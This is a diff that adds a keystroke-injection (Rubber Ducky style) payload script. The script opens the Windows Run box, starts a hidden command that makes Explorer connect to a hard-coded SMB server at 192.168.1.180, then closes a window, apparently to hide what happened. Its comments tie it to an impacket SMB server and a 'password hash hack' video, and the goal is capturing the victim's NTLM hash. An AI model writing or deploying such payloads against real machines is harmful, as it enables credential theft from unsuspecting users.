@@ -1,0 +1,16 @@
+REM Needs a smb server on the mentioned ip
+REM Used this project:
+REM https://github.com/CoreSecurity/impacket/blob/master/examples/smbserver.py
+REM Had to append the -smb2support parameter
+REM Full attack is described in:
+REM https://www.youtube.com/watch?v=BH4M7djZfew
+REM ( 2 Second Password Hash Hack - Hak5 2102 )
+
+GUI r
+DELAY 100
+STRING cmd /C "start /MIN explorer \\192.168.1.180"
+ENTER
+DELAY 2000
+ALT TAB
+DELAY 100
+ALT F4
